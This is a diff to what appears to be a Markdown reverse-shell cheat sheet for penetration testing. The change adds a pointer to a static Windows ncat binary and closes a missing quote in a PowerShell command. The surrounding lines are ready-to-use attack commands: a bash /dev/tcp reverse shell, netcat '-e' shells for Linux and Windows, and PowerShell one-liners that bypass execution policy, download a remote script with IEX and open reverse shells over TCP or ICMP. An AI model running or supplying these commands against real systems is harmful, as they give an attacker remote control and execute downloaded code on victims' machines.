@@ -190,6 +190,7 @@ exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0
 ```
 # If nc e option available:
 nc -e /bin/sh <IP> <PORT> &
+# The ncat.exe from https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe offers a better compatibility across Windows systems
 nc.exe -e cmd.exe <IP> <PORT>
 
 # Else (Linux):
@@ -249,7 +250,7 @@ on the remote webserver:
 
 ```powershell
 # TCP
-powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"
 
 # ICMP - Needs a ICMP listener
 powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress <IP>"
